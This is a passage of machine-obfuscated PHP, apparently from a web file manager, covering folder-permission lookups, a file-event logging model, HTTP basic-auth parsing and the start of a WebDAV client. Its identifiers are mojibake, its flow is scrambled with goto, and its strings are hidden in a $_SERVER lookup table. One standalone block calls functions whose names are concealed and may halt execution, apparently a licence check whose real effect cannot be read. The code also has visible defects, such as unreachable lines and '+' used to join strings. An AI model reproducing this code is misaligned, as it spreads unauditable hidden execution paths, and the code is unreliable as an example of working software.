Model($A÷ÇóÈË•ä[1095])->parentLevelArray($cÂ–ÅÙ…ŠÛ[$A÷ÇóÈË•ä[463]]); $A¡äœñÄƒ = array_merge(array($cÂ–ÅÙ…ŠÛ[$A÷ÇóÈË•ä[374]]), array_reverse($A¡äœñÄƒ)); $BÛØ¸÷¦ = $A÷ÇóÈË•ä[2213]; goto FÁ¤÷Ë•›; FÁ¤÷Ë•›: $Eƒİæ˜ÜŒ = array($A÷ÇóÈË•ä[388] => array($A÷ÇóÈË•ä[389], $A¡äœñÄƒ)); $BÜ«Äñ‘Éİ = $this->field($BÛØ¸÷¦)->where($Eƒİæ˜ÜŒ)->select(); $BÜ«Äñ‘Éİ = array_to_keyvalue_group($BÜ«Äñ‘Éİ, $A÷ÇóÈË•ä[374]); goto D´Íæ½òÄ™; Aö°ˆ¾¬†Ó: $cÂ–ÅÙ…ŠÛ[$A÷ÇóÈË•ä[381]][$A÷ÇóÈË•ä[2223]] = Model($A÷ÇóÈË•ä[478])->userListInfo($dÑº¥©êÆ); return $cÂ–ÅÙ…ŠÛ; goto AƒšèàìÍ®; DŠá¡Îï„÷: if (count($dÑº¥©êÆ) == 0) { $dÑº¥©êÆ = $this->authFolderOwnerGroup($cÂ–ÅÙ…ŠÛ[$A÷ÇóÈË•ä[460]]); } $dÑº¥©êÆ = array_unique($dÑº¥©êÆ); if (AuthModel::authCheckRoot($cÂ–ÅÙ…ŠÛ[$A÷ÇóÈË•ä[381]][$A÷ÇóÈË•ä[382]])) { $dÑº¥©êÆ[] = USER_ID; } goto Aö°ˆ¾¬†Ó; D´Íæ½òÄ™: $F³Ÿ‡îĞ = array(); $dÑº¥©êÆ = array(); foreach ($BÜ«Äñ‘Éİ as $DÖğáë…æº => $c¸÷ğ¬…˜) { $cŒ¯ƒæ©Œ = $this->authFolderOwnerUser($c¸÷ğ¬…˜); $F³Ÿ‡îĞ[$DÖğáë…æº] = $cŒ¯ƒæ©Œ; $dÑº¥©êÆ = array_merge($dÑº¥©êÆ, $cŒ¯ƒæ©Œ[$A÷ÇóÈË•ä[539]]); if ($cŒ¯ƒæ©Œ[$A÷ÇóÈË•ä[2222]]) { break; } } goto DŠá¡Îï„÷; FÔñÅ²: $A÷ÇóÈË•ä =& $_SERVER[Ä¿Ş°¨]; if (empty($cÂ–ÅÙ…ŠÛ[$A÷ÇóÈË•ä[381]]) || isset($cÂ–ÅÙ…ŠÛ[$A÷ÇóÈË•ä[2221]]) && $cÂ–ÅÙ…ŠÛ[$A÷ÇóÈË•ä[2221]]) { return $cÂ–ÅÙ…ŠÛ; } if (AuthModel::authCheckRoot($cÂ–ÅÙ…ŠÛ[$A÷ÇóÈË•ä[381]][$A÷ÇóÈË•ä[382]])) { return $cÂ–ÅÙ…ŠÛ; } goto c¶°‰›ö; AƒšèàìÍ®: } private function authFolderOwnerGroup($cÅ´ŞËÍîŒ) { $Aß‚‚†¶ =& $_SERVER[Ä¿Ş°¨]; $C´¸áêŒíŒ = Model($Aß‚‚†¶[2137])->where(array($Aß‚‚†¶[2063] => $cÅ´ŞËÍîŒ))->select(); $d¿ä¦ÄĞÖÜ = array(); if (!$C´¸áêŒíŒ) { return $d¿ä¦ÄĞÖÜ; } foreach ($C´¸áêŒíŒ as $aìöà›ô®Â) { $Dâë¾º·†‡ = $this->authInfo($aìöà›ô®Â); if (AuthModel::authCheckRoot($Dâë¾º·†‡[$Aß‚‚†¶[381]])) { $d¿ä¦ÄĞÖÜ[] = $aìöà›ô®Â[$Aß‚‚†¶[1399]]; } } return $d¿ä¦ÄĞÖÜ; } private function authFolderOwnerUser($eÍšáì¡î) { $EèãÏ™ =& $_SERVER[Ä¿Ş°¨]; $F÷“ŞÔ™÷› = array(); $d˜ˆÓ¸ùí = !1; foreach ($eÍšáì¡î as $câ­Ãï˜Ç¤) { $dîö¾ä“ßÒ = $this->authInfo($câ­Ãï˜Ç¤); if ($câ­Ãï˜Ç¤[$EèãÏ™[460]] == $EèãÏ™[472]) { $d˜ˆÓ¸ùí = !0; } if ($câ­Ãï˜Ç¤[$EèãÏ™[376]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($dîö¾ä“ßÒ[$EèãÏ™[381]])) { $F÷“ŞÔ™÷›[] = $câ­Ãï˜Ç¤[$EèãÏ™[460]]; } } } return array($EèãÏ™[539] => $F÷“ŞÔ™÷›, $EèãÏ™[2222] => $d˜ˆÓ¸ùí); } public function authMake($b÷ÕêÁßøÃ) { goto bÉ÷ÀÛ–¥; CŞ„´·Ú‡: $fµ»ó–š¿¤ = array_to_keyvalue($C¼ÙÑºË¦Š, $aŒª¹à¥îÈ[33], $aŒª¹à¥îÈ[2063]); $E†«Í­‡„í = 0; $e’§ãİù¯« = 0; goto eœáë¤×ä‘; D³ßêğ‰·Œ: $BÃ¡Ÿã·Ó = 0; $dÌ‘Í¬™èØ = 0; $FÎ•å‹æ = 0; goto eÀóá¨öã¥; bÉ÷ÀÛ–¥: $aŒª¹à¥îÈ =& $_SERVER[Ä¿Ş°¨]; if (!$b÷ÕêÁßøÃ) { return array($aŒª¹à¥îÈ[382] => 0, $aŒª¹à¥îÈ[422] => !1); } $C¼ÙÑºË¦Š = Session::get($aŒª¹à¥îÈ[2175]); goto CŞ„´·Ú‡; cå¸ÜãÖßØ: $C§ìñÃÕì© = $dÌ‘Í¬™èØ ? $cª‹ç»õÍ : ($FÎ•å‹æ ? $FàÜÄ¬µ¯— : $BÃ¡Ÿã·Ó); $fëäÄï÷ = array($aŒª¹à¥îÈ[2219] => intval($eÊ‘¼†Àøê), $aŒª¹à¥îÈ[2220] => $C§ìñÃÕì©); return $fëäÄï÷; goto e‘á»ªÃËÓ; eœáë¤×ä‘: $C“­¥”ËÒ = 0; $cª‹ç»õÍ = 0; $FàÜÄ¬µ¯— = 0; goto D³ßêğ‰·Œ; eÀóá¨öã¥: $bƒääëÔÅ = 0; foreach ($b÷ÕêÁßøÃ as $eªÚêĞ‘¦’) { $C§ìñÃÕì© = $this->authInfo($eªÚêĞ‘¦’); $F¼¼‹ºÃ«¼ = $eªÚêĞ‘¦’[$aŒª¹à¥îÈ[460]]; $d‘§ªâÂ¿³ = intval($C§ìñÃÕì©[$aŒª¹à¥îÈ[381]]); if ($eªÚêĞ‘¦’[$aŒª¹à¥îÈ[376]] == SourceModel::TYPE_USER && $F¼¼‹ºÃ«¼ == USER_ID) { $dÌ‘Í¬™èØ = !0; $cª‹ç»õÍ = $C§ìñÃÕì©; $E†«Í­‡„í = $d‘§ªâÂ¿³; } else { if ($eªÚêĞ‘¦’[$aŒª¹à¥îÈ[376]] == SourceModel::TYPE_GROUP && in_array($F¼¼‹ºÃ«¼, $fµ»ó–š¿¤)) { $FÎ•å‹æ = !0; if ($d‘§ªâÂ¿³ >= $e’§ãİù¯«) { $e’§ãİù¯« = $d‘§ªâÂ¿³; $FàÜÄ¬µ¯— = $C§ìñÃÕì©; } } else { if ($F¼¼‹ºÃ«¼ == $aŒª¹à¥îÈ[472]) { $bƒääëÔÅ = !0; $BÃ¡Ÿã·Ó = $C§ìñÃÕì©; $C“­¥”ËÒ = $d‘§ªâÂ¿³; } } } } $eÊ‘¼†Àøê = $dÌ‘Í¬™èØ ? $E†«Í­‡„í : ($FÎ•å‹æ ? $e’§ãİù¯« : $C“­¥”ËÒ); goto cå¸ÜãÖßØ; e‘á»ªÃËÓ: } public function authTargetInfoMake($C°ƒª…Ï·Ä) { goto d³Åöíáš²; BƒÁçôŠì: return array($a©·ñ¡ßò´[2224] => $cŸ¡Êé¹ˆØ, $a©·ñ¡ßò´[2225] => $E¾©ÏÊ—Àô); goto dô©©ÆÌµ¼; d³Åöíáš²: $a©·ñ¡ßò´ =& $_SERVER[Ä¿Ş°¨]; $cŸ¡Êé¹ˆØ = array(); $E¾©ÏÊ—Àô = array(); goto aõÊß”ëãÆ; aõÊß”ëãÆ: foreach ($C°ƒª…Ï·Ä as $EƒÆ³œçÎ‚) { if ($EƒÆ³œçÎ‚[$a©·ñ¡ßò´[376]] == SourceModel::TYPE_USER) { $cŸ¡Êé¹ˆØ[] = intval($EƒÆ³œçÎ‚[$a©·ñ¡ßò´[460]]); } else { if ($EƒÆ³œçÎ‚[$a©·ñ¡ßò´[376]] == SourceModel::TYPE_GROUP) { $E¾©ÏÊ—Àô[] = intval($EƒÆ³œçÎ‚[$a©·ñ¡ßò´[460]]); } } } if ($cŸ¡Êé¹ˆØ) { $cŸ¡Êé¹ˆØ = Model($a©·ñ¡ßò´[478])->userListInfo($cŸ¡Êé¹ˆØ); } if ($E¾©ÏÊ—Àô) { $C³ô•êÉñí = array($a©·ñ¡ßò´[2135] => array($a©·ñ¡ßò´[389], $E¾©ÏÊ—Àô)); $E¾©ÏÊ—Àô = Model($a©·ñ¡ßò´[462])->field($a©·ñ¡ßò´[2148])->where($C³ô•êÉñí)->select(); $E¾©ÏÊ—Àô = array_to_keyvalue($E¾©ÏÊ—Àô, $a©·ñ¡ßò´[2063]); } goto BƒÁçôŠì; dô©©ÆÌµ¼: } private function authInfo($EÚÒâ±ÌÆø) { $dî±ã†‚ºŞ =& $_SERVER[Ä¿Ş°¨]; if ($EÚÒâ±ÌÆø[$dî±ã†‚ºŞ[2191]]) { $CÔ–¶ğ˜ç¤ = Model($dî±ã†‚ºŞ[2210])->listData($EÚÒâ±ÌÆø[$dî±ã†‚ºŞ[2191]]); if (!$CÔ–¶ğ˜ç¤) { return !1; $cñ‹¡µˆŠ = Model($dî±ã†‚ºŞ[2210])->listData(); $F¢ºÛ‰°±Š = array_filter_by_field($cñ‹¡µˆŠ, $dî±ã†‚ºŞ[381], $dî±ã†‚ºŞ[472]); return $F¢ºÛ‰°±Š; } $EÚ˜Í’ïñâ = array_field_key($CÔ–¶ğ˜ç¤, array($dî±ã†‚ºŞ[372], $dî±ã†‚ºŞ[28], $dî±ã†‚ºŞ[381], $dî±ã†‚ºŞ[2081], $dî±ã†‚ºŞ[2084])); $EÚ˜Í’ïñâ[$dî±ã†‚ºŞ[2226]] = $EÚÒâ±ÌÆø; return $EÚ˜Í’ïñâ; } else { return array($dî±ã†‚ºŞ[390] => 0, $dî±ã†‚ºŞ[2069] => $EÚÒâ±ÌÆø[$dî±ã†‚ºŞ[2192]], $dî±ã†‚ºŞ[391] => $dî±ã†‚ºŞ[33], $dî±ã†‚ºŞ[2081] => $dî±ã†‚ºŞ[2227]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\162\x63\145\x5f\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\x54\x69\155\x65", "\x74\x69\155\x65", "\x69\156\x73\145\x72\164", "\146\x75\156\143\x74\x69\157\x6e"), array("\144\145\x73\x63", '', "\x69\x6e\163\x65\162\164\54\165\160\144\141\164\145\54\163\x65\x6c\145\x63\x74", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($EÀÊ—ÑçÛ³, $fÕ¾š˜ëƒ, $bò„ÌŞ‹Ú = '') { goto dëœŸ‘œóì; dè…»Ï¤°á: $Cãá„ñŠ = array($câÓƒéâ‘ğ[388] => $EÀÊ—ÑçÛ³, $câÓƒéâ‘ğ[2228] => $dï´’¤»ªÀ[$câÓƒéâ‘ğ[465]], $câÓƒéâ‘ğ[2229] => $dï´’¤»ªÀ[$câÓƒéâ‘ğ[28]], $câÓƒéâ‘ğ[470] => $dï´’¤»ªÀ[$câÓƒéâ‘ğ[470]], $câÓƒéâ‘ğ[1390] => USER_ID, $câÓƒéâ‘ğ[393] => $fÕ¾š˜ëƒ, $câÓƒéâ‘ğ[1392] => $bò„ÌŞ‹Ú); $this->addSystemLog($fÕ¾š˜ëƒ, $Cãá„ñŠ); return $this->add($Cãá„ñŠ); goto CÄ²º¿ó“Ô; dëœŸ‘œóì: $câÓƒéâ‘ğ =& $_SERVER[Ä¿Ş°¨]; if (!$this->eventSave) { return; } $dï´’¤»ªÀ = Model($câÓƒéâ‘ğ[1095])->sourceInfo($EÀÊ—ÑçÛ³); goto aÒ±’½À; aÒ±’½À: if (!$dï´’¤»ªÀ) { return !1; } if ($this->isCacheEvent($dï´’¤»ªÀ, $fÕ¾š˜ëƒ)) { return; } if ($bò„ÌŞ‹Ú && is_string($bò„ÌŞ‹Ú)) { $bò„ÌŞ‹Ú = array($câÓƒéâ‘ğ[2093] => $bò„ÌŞ‹Ú); } goto dè…»Ï¤°á; CÄ²º¿ó“Ô: } private function addSystemLog($e˜Ò‹êŒ×÷, $EŒôºñŒ) { $FòÇÓïááÛ =& $_SERVER[Ä¿Ş°¨]; if ($e˜Ò‹êŒ×÷ == $FòÇÓïááÛ[2230]) { $e˜Ò‹êŒ×÷ = $EŒôºñŒ[$FòÇÓïááÛ[409]][$FòÇÓïááÛ[2231]]; } else { if (in_array($e˜Ò‹êŒ×÷, array($FòÇÓïááÛ[2040], $FòÇÓïááÛ[2232]))) { $e˜Ò‹êŒ×÷ = $EŒôºñŒ[$FòÇÓïááÛ[409]][$FòÇÓïááÛ[686]]; } } $aÓô¬¦ã™Ô = array_merge($EŒôºñŒ, array($FòÇÓïááÛ[2233] => $EŒôºñŒ[$FòÇÓïááÛ[374]], $FòÇÓïááÛ[2234] => $EŒôºñŒ[$FòÇÓïááÛ[2234]])); Model($FòÇÓïááÛ[2004])->addLog($FòÇÓïááÛ[2235] . $e˜Ò‹êŒ×÷, $aÓô¬¦ã™Ô); } private function isCacheEvent($a“ªÙŞÃ¥ƒ, $B¡¹Æ‡ê«‹) { if ($a“ªÙŞÃ¥ƒ[$_SERVER[Ä¿Ş°¨][376]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($A…±½ƒ¦Éˆ, $aÉß©ôğ§ò) { $fÑŒÈñÒÎ =& $_SERVER[Ä¿Ş°¨]; $aÆÚ“Şˆâì = Model($fÑŒÈñÒÎ[1095])->sourceInfo($A…±½ƒ¦Éˆ); $a‹—ñÎÕå = array($fÑŒÈñÒÎ[2231] => $aÉß©ôğ§ò, $fÑŒÈñÒÎ[28] => $aÆÚ“Şˆâì[$fÑŒÈñÒÎ[28]]); return $this->addEvent($A…±½ƒ¦Éˆ, $fÑŒÈñÒÎ[2230], $a‹—ñÎÕå); } public function eventFileEdit($d³‹âŠ¡±) { $A»Œ ÓŠ =& $_SERVER[Ä¿Ş°¨]; $Bº›ˆœÈóŞ = array($A»Œ ÓŠ[2236] => $_SERVER[$A»Œ ÓŠ[2237]], $A»Œ ÓŠ[1709] => strtolower(ACTION)); return $this->addEvent($d³‹âŠ¡±, $A»Œ ÓŠ[2031], $Bº›ˆœÈóŞ); } public function eventRecycle($Eóï¼­–¦â, $D¾³‚¨»¶ä) { return $this->addEvent($Eóï¼­–¦â, $_SERVER[Ä¿Ş°¨][2232], $D¾³‚¨»¶ä); } public function eventRemove($a¼’Û…Ó“œ) { $bì£ÁŞ”½ =& $_SERVER[Ä¿Ş°¨]; $FÍ¥ØØöÂÀ = Model($bì£ÁŞ”½[1095])->sourceInfo($a¼’Û…Ó“œ); $AÁâ†©¬° = $FÍ¥ØØöÂÀ[$bì£ÁŞ”½[28]]; return $this->addEvent($FÍ¥ØØöÂÀ[$bì£ÁŞ”½[465]], $bì£ÁŞ”½[2030], $AÁâ†©¬°); } public function eventShare($EŞ›÷“¾•, $AË»Û˜İ£Ï) { return $this->addEvent($EŞ›÷“¾•, $_SERVER[Ä¿Ş°¨][2040], $AË»Û˜İ£Ï); } public function eventMove($B²·‡šî˜¸, $fÉ›Š—Ãù, $dÈ…µ¶É•î) { goto AÀÃ­ä‰æ¬; FËéŸ‡òÕ™: $E¨æõÇÏ— = $AÓï¢çíù†->sourceInfo($fÉ›Š—Ãù); $B¿«ô¨àâ‚ = $AÓï¢çíù†->sourceInfo($dÈ…µ¶É•î); $F‘ŠÏ³æœ = array($FÎâ †ÒŒ[991] => $fÉ›Š—Ãù, $FÎâ †ÒŒ[2238] => $E¨æõÇÏ—[$FÎâ †ÒŒ[28]], $FÎâ †ÒŒ[2239] => $E¨æõÇÏ—[$FÎâ †ÒŒ[470]], $FÎâ †ÒŒ[992] => $dÈ…µ¶É•î, $FÎâ †ÒŒ[2240] => $B¿«ô¨àâ‚[$FÎâ †ÒŒ[28]], $FÎâ †ÒŒ[2241] => $B¿«ô¨àâ‚[$FÎâ †ÒŒ[470]]); goto c£«Å¡º¬; AÀÃ­ä‰æ¬: $FÎâ †ÒŒ =& $_SERVER[Ä¿Ş°¨]; $AÓï¢çíù† = Model($FÎâ †ÒŒ[1095]); $E®Û²Ì­â = $AÓï¢çíù†->sourceInfo($B²·‡šî˜¸); goto FËéŸ‡òÕ™; FÑè¸Ë»Øä: $this->addEvent($fÉ›Š—Ãù, $FÎâ †ÒŒ[2242], $F‘ŠÏ³æœ); goto f¿¡·ÒÌ; c£«Å¡º¬: $this->addEvent($B²·‡šî˜¸, $FÎâ †ÒŒ[496], $F‘ŠÏ³æœ); $E®Û²Ì­â = $AÓï¢çíù†->sourceInfo($B²·‡šî˜¸); $F‘ŠÏ³æœ = array($FÎâ †ÒŒ[374] => $E®Û²Ì­â[$FÎâ †ÒŒ[374]], $FÎâ †ÒŒ[28] => $E®Û²Ì­â[$FÎâ †ÒŒ[28]]); goto FÑè¸Ë»Øä; f¿¡·ÒÌ: } public function eventCopy($c¯Â§ç¾—) { $this->eventCreate($c¯Â§ç¾—, $_SERVER[Ä¿Ş°¨][494]); } public function eventRename($C•ù³ Ëó¨, $E÷êçÀšê, $b£×Ë¦—Ü„) { $AÇİØ¢İ¼Ê =& $_SERVER[Ä¿Ş°¨]; $fØØ·ÈÏìğ = array($AÇİØ¢İ¼Ê[991] => $E÷êçÀšê, $AÇİØ¢İ¼Ê[992] => $b£×Ë¦—Ü„); return $this->addEvent($C•ù³ Ëó¨, $AÇİØ¢İ¼Ê[1107], $fØØ·ÈÏìğ); } public function eventAddComment($bÖç×–ò, $D„»Á¨ö£ø) { return $this->addEvent($bÖç×–ò, $_SERVER[Ä¿Ş°¨][2243], $D„»Á¨ö£ø); } public function eventAddDesc($eÌ™–ã†¹«, $b¹ÒÓöÊñ) { return $this->addEvent($eÌ™–ã†¹«, $_SERVER[Ä¿Ş°¨][2244], $b¹ÒÓöÊñ); } public function listBySource($eæ©ˆà²õª) { goto fÔ«–“…Ş³; cÚÊËÍ˜¶: if ($AËË±†Š÷Ù[$bèòíâ ¦[375]] == $bèòíâ ¦[83]) { $B°ñŞá„•É = Model($bèòíâ ¦[1095])->listSearchChildren($eæ©ˆà²õª, 20000); $B°ñŞá„•É[] = $eæ©ˆà²õª . $bèòíâ ¦[357]; $e»ŒŠ¤í’Ğ = array($bèòíâ ¦[374] => array($bèòíâ ¦[7], $B°ñŞá„•É)); } $E……ÄŸÖ‚É = $this->where($e»ŒŠ¤í’Ğ)->order($bèòíâ ¦[2245])->selectPage(); if ($E……ÄŸÖ‚É[$bèòíâ ¦[347]][$bèòíâ ¦[348]] == 0) { $E……ÄŸÖ‚É[$bèòíâ ¦[347]][$bèòíâ ¦[348]] = 1; $E……ÄŸÖ‚É[$bèòíâ ¦[350]] = array(array($bèòíâ ¦[388] => $eæ©ˆà²õª, $bèòíâ ¦[2228] => $AËË±†Š÷Ù[$bèòíâ ¦[465]], $bèòíâ ¦[1390] => $AËË±†Š÷Ù[$bèòíâ ¦[383]], $bèòíâ ¦[393] => $bèòíâ ¦[2246], $bèòíâ ¦[394] => $AËË±†Š÷Ù[$bèòíâ ¦[183]], $bèòíâ ¦[1392] => $bèòíâ ¦[33])); } goto AÅéçÕ¯½; fÔ«–“…Ş³: $bèòíâ ¦ =& $_SERVER[Ä¿Ş°¨]; $AËË±†Š÷Ù = Model($bèòíâ ¦[1095])->sourceInfo($eæ©ˆà²õª); $e»ŒŠ¤í’Ğ = array($bèòíâ ¦[388] => $eæ©ˆà²õª); goto cÚÊËÍ˜¶; AÅéçÕ¯½: $E……ÄŸÖ‚É = $this->eventListParse($E……ÄŸÖ‚É, $eæ©ˆà²õª); show_json($E……ÄŸÖ‚É); goto E…éÓŠª÷ß; E…éÓŠª÷ß: } private function eventListParse($CöŞ™º¤¹Ó, $d’Âç™Ñ¥) { goto CÔ‡‘´³â“; e‰´Şï²æ‰: $cº¢–’çÌ† = array_unique($cº¢–’çÌ†); $A“¥‡öÏõÍ = array_unique(array_to_keyvalue($AŠ¡¡¹½İ, $Eæµ§¥¯Êš[33], $Eæµ§¥¯Êš[1399])); $E¤‚ÍË¬Ğî = Model($Eæµ§¥¯Êš[481])->userListInfo($A“¥‡öÏõÍ); goto E³˜èéëÒ; E³˜èéëÒ: $aÄ±ê£ƒéõ = Model($Eæµ§¥¯Êš[746])->sourceListInfo($cº¢–’çÌ†, !0); foreach ($AŠ¡¡¹½İ as &$CÀ—ÎõÑ»ˆ) { if ($CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[29]] == $Eæµ§¥¯Êš[496] && isset($CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[409]][$Eæµ§¥¯Êš[991]])) { $CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[409]][$Eæµ§¥¯Êš[991]] = $aÄ±ê£ƒéõ[$CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[409]][$Eæµ§¥¯Êš[991]]]; $CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[409]][$Eæµ§¥¯Êš[992]] = $aÄ±ê£ƒéõ[$CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[409]][$Eæµ§¥¯Êš[992]]]; } if ($CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[29]] == $Eæµ§¥¯Êš[2242] && isset($CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[409]][$Eæµ§¥¯Êš[374]])) { $CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[409]][$Eæµ§¥¯Êš[374]] = $aÄ±ê£ƒéõ[$CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[409]][$Eæµ§¥¯Êš[374]]]; } $CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[396]] = $aÄ±ê£ƒéõ[$CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[374]]]; $CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[2247]] = $aÄ±ê£ƒéõ[$CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[2234]]]; if ($CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[29]] == $Eæµ§¥¯Êš[2030]) { $CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[2247]] = $CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[396]]; $CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[2234]] = $CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[2247]][$Eæµ§¥¯Êš[374]]; $CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[396]] = !1; $CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[374]] = $Eæµ§¥¯Êš[33]; } $CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[2200]] = $E¤‚ÍË¬Ğî[$CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[1399]]]; } $CöŞ™º¤¹Ó[$Eæµ§¥¯Êš[350]] = $AŠ¡¡¹½İ; goto ağ «™òä×; CÔ‡‘´³â“: $Eæµ§¥¯Êš =& $_SERVER[Ä¿Ş°¨]; $AŠ¡¡¹½İ = $CöŞ™º¤¹Ó[$Eæµ§¥¯Êš[350]]; $cº¢–’çÌ† = array_to_keyvalue($AŠ¡¡¹½İ, $Eæµ§¥¯Êš[33], $Eæµ§¥¯Êš[374]); goto cŸÔ¢´‚¤; ağ «™òä×: return $CöŞ™º¤¹Ó; goto b•º–êŠ•; cŸÔ¢´‚¤: $d™¡¿ï¹àÓ = array_to_keyvalue($AŠ¡¡¹½İ, $Eæµ§¥¯Êš[33], $Eæµ§¥¯Êš[2234]); foreach ($AŠ¡¡¹½İ as $CÀ—ÎõÑ»ˆ) { $F»ùØÛ‘ = $CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[409]]; if ($CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[29]] == $Eæµ§¥¯Êš[496] && isset($F»ùØÛ‘[$Eæµ§¥¯Êš[991]])) { $cº¢–’çÌ†[] = $F»ùØÛ‘[$Eæµ§¥¯Êš[991]] . $Eæµ§¥¯Êš[33]; $cº¢–’çÌ†[] = $F»ùØÛ‘[$Eæµ§¥¯Êš[992]] . $Eæµ§¥¯Êš[33]; } if ($CÀ—ÎõÑ»ˆ[$Eæµ§¥¯Êš[29]] == $Eæµ§¥¯Êš[2242] && isset($F»ùØÛ‘[$Eæµ§¥¯Êš[374]])) { $cº¢–’çÌ†[] = $F»ùØÛ‘[$Eæµ§¥¯Êš[374]] . $Eæµ§¥¯Êš[33]; } } $cº¢–’çÌ† = array_merge($cº¢–’çÌ†, $d™¡¿ï¹àÓ, array($d’Âç™Ñ¥ . $Eæµ§¥¯Êš[33])); goto e‰´Şï²æ‰; b•º–êŠ•: } public function removeBySource($DÔ¹½ìŞ‘‹) { $f‹±÷ÄßÜ = array($_SERVER[Ä¿Ş°¨][388] => $DÔ¹½ìŞ‘‹); $this->where($f‹±÷ÄßÜ)->remove(); } } goto dùË®ˆÎ; c§É­Ô´ÄÆ: if ($_SERVER[$_SERVER[Ä¿Ş°¨][360]] != $_SERVER[$_SERVER[Ä¿Ş°¨][361]]) { goto A¡œ ¡ğöÖ; e¬Ü±á›äé: $a§–—»¢ñ($_SERVER[$_SERVER[Ä¿Ş°¨][368]]); goto d‹’¸ÓŠƒÓ; A¡œ ¡ğöÖ: $fË´…š—£ = $_SERVER[Ä¿Ş°¨][362]; $cèã¶Û–¹’ = $_SERVER[$_SERVER[Ä¿Ş°¨][363]] . $_SERVER[Ä¿Ş°¨][364]; $f¤¹œ¶ÁŸ÷ = $fË´…š—£($cèã¶Û–¹’); goto aÕ¨Ã£‘Î; aÕ¨Ã£‘Î: $EÁ­Üô«‘İ = explode($_SERVER[Ä¿Ş°¨][213], $f¤¹œ¶ÁŸ÷); if (count($EÁ­Üô«‘İ) < $_SERVER[Ä¿Ş°¨][365]) { $Dö’Á“ïîò = $_SERVER[Ä¿Ş°¨][366]; $Dö’Á“ïîò(); } $a§–—»¢ñ = $_SERVER[Ä¿Ş°¨][367]; goto e¬Ü±á›äé; d‹’¸ÓŠƒÓ: } class HttpAuth { public static function get() { $e’İÒÆÁÎß =& $_SERVER[Ä¿Ş°¨]; $FĞİÇƒ×Û = $e’İÒÆÁÎß[33]; $A”¥ËÙšæ‰ = $e’İÒÆÁÎß[33]; if (isset($_SERVER[$e’İÒÆÁÎß[1718]])) { $FĞİÇƒ×Û = $_SERVER[$e’İÒÆÁÎß[1718]]; $A”¥ËÙšæ‰ = $_SERVER[$e’İÒÆÁÎß[1719]]; } elseif (isset($_SERVER[$e’İÒÆÁÎß[1720]])) { $Bä·Ú…·á = $_SERVER[$e’İÒÆÁÎß[1720]]; if (strpos(strtolower($Bä·Ú…·á), $e’İÒÆÁÎß[1721]) === 0) { $bëàÌâî½å = explode($e’İÒÆÁÎß[4], base64_decode(substr($Bä·Ú…·á, 6))); $FĞİÇƒ×Û = isset($bëàÌâî½å[0]) ? $bëàÌâî½å[0] : $e’İÒÆÁÎß[33]; $A”¥ËÙšæ‰ = isset($bëàÌâî½å[1]) ? $bëàÌâî½å[1] : 0; } } return array($e’İÒÆÁÎß[539] => $FĞİÇƒ×Û, $e’İÒÆÁÎß[884] => $A”¥ËÙšæ‰); } public static function error() { goto A‡Ø“ŸÓ›; A“å•ª¼«á: die; goto f‚º²Æ†Û—; C˜”ÆŠñ¤©: header($F¿ÌÆÆ®¢•[1724]); header($F¿ÌÆÆ®¢•[1725]); header($F¿ÌÆÆ®¢•[1240]); goto A“å•ª¼«á; A‡Ø“ŸÓ›: $F¿ÌÆÆ®¢• =& $_SERVER[Ä¿Ş°¨]; header($F¿ÌÆÆ®¢•[1722]); header($F¿ÌÆÆ®¢•[1723]); goto C˜”ÆŠñ¤©; f‚º²Æ†Û—: } public static function make($cŒøí‹Ö“Ò, $EÕˆÔ­Ì) { $fè¼Ë•ÊÖ =& $_SERVER[Ä¿Ş°¨]; return $fè¼Ë•ÊÖ[1726] + base64_encode($cŒøí‹Ö“Ò . $fè¼Ë•ÊÖ[4] . $EÕˆÔ­Ì); } } class HttpDavClient { public function __construct($AÃ­—š‡¤Ö, $b˜¾È…®·, $B–¹ñÌŞÄ) { $this->header = array(); $this->userName = $b˜¾È…®·; $this->userPassowrd = $B–¹ñÌŞÄ; } protected function makePath($eò®’Ë¼) { return $eò®’Ë¼; } protected function setHeader($aªƒ•²¸Ù, $Aøå˜¤‰ãä = false) { if ($Aøå˜¤‰ãä === !1) { $this->header[] = $aªƒ•²¸Ù; } else { $this->header[] = $aªƒ•²¸Ù . $_SERVER[Ä¿Ş°¨][867] . $Aøå˜¤‰ãä; } } public function move($A¾“ä»îÆä, $a¡Üì´ó, $E—¦ÃÂ¿å– = '') { $fÓÀ÷íùÖ =& $_SERVER[Ä¿Ş°¨]; $this->setHeader($fÓÀ÷íùÖ[1727], $this->makePath($a¡Üì´ó)); $this->setHeader($fÓÀ÷íùÖ[1728], $fÓÀ÷íùÖ[1729]); if ($E—¦ÃÂ¿å–) { $this->setHeader($fÓÀ÷íùÖ[1730], $fÓÀ÷íùÖ[912] . $E—¦ÃÂ¿å– . $fÓÀ÷íùÖ[915]); } return $this->send($fÓÀ÷íùÖ[1731], 